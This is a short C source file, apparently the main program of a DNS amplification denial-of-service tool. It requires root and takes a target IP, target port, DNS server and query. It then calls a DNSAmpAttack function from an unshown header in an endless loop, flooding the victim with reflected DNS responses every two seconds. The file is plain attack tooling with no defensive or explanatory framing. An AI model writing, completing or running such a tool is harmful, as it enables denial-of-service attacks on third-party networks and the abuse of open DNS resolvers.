#include "dns.h"
#include "stdio.h"
#include "stdlib.h"

int main(int argc, char** argv){
    if(getuid() != 0){
        printf("Run as root.\n");
        return 1;
    }

    if(argc < 5){
        printf("Usage %s <target ip> <target port> <dns server> <dns query>\n", argv[0]);
        return 1;
    }

    while(1){
        DNSAmpAttack(argv[1], atoi(argv[2]), argv[3], argv[4]);
        sleep(2);
    }

    return 0;
}
